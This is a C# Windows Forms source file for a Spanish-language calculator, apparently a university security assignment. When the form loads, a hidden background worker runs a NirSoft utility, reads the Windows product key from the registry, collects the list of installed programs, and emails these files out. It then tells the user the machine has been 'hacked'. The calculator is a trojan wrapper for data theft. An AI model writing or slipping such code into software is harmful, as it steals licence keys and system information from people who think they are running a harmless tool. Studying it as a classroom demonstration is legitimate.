using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Windows.Forms;
using System.IO;

namespace TP
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        #region Calculadora
        Double val = 0;
        string operation = "";
        bool oper_pressed = false;

        int dotCount = 0;


        private void operator_click(object sender, EventArgs e)
        {
            Button b = (Button)sender;
            operation = b.Text;
            val = Double.Parse(inputBox.Text);
            oper_pressed = true;
            equation.Text = val + " " + operation;
        }

        private void button_click(object sender, EventArgs e)
        {
            if ((inputBox.Text == "0") || (oper_pressed))
            {
                inputBox.Clear();
                dotCount = 0;
            }

            oper_pressed = false;
            Button b = (Button)sender;
            if (b.Text == "." && dotCount < 1)
            {
                dotCount++;
                inputBox.Text = inputBox.Text + b.Text;
            }
            if (b.Text != ".")
            {
                inputBox.Text = inputBox.Text + b.Text;
            }

        }

        private void clear_click(object sender, EventArgs e)
        {
            inputBox.Text = "0";
            dotCount = 0;
        }

        private void clear_all(object sender, EventArgs e)
        {
            inputBox.Text = "0";
            val = 0;
            dotCount = 0;
        }

        private void equal_click(object sender, EventArgs e)
        {
            equation.Text = "";
            switch (operation)
            {
                case "+":
                    inputBox.Text = (val + Double.Parse(inputBox.Text)).ToString();
                    break;
                case "-":
                    inputBox.Text = (val - Double.Parse(inputBox.Text)).ToString();
                    break;
                case "*":
                    inputBox.Text = (val * Double.Parse(inputBox.Text)).ToString();
                    break;
                case "/":
                    inputBox.Text = (val / Double.Parse(inputBox.Text)).ToString();
                    break;
                default:
                    break;
            }
            double ans = double.Parse(inputBox.Text);
            if (ans == (double)ans)
            {
                dotCount = 1;
            }
            else
                dotCount = 0;

        }
#endregion

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            Console.WriteLine("Abriendo calculadora. Por favor espere...");
            List<string> files = new List<string>();

            //files.NirsoftToolExecAndAdd("ProduKey.exe");
            files.NirsoftToolExecAndAdd("awatch.exe");
            
            string key = Helpers.GetWindowsProductKeyFromRegistry();
            var path = @"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\produkey.txt";
            File.WriteAllText(path, key);
            Helpers.getProgramList();
            files.Add(path);
            files.Add(@"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\programList.txt");
            Helpers.sendMail("Hack Test", "Hacked Files", files);
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Error != null)
            {
                string msg = String.Format("Se ha producido el siguiente error: {0}", e.Error.Message);
                MessageBox.Show(msg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("Su equipo ha sido hackeado. Gracias por utilizar la calculadora.", "Operación terminada", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync(true);
        }
    }
}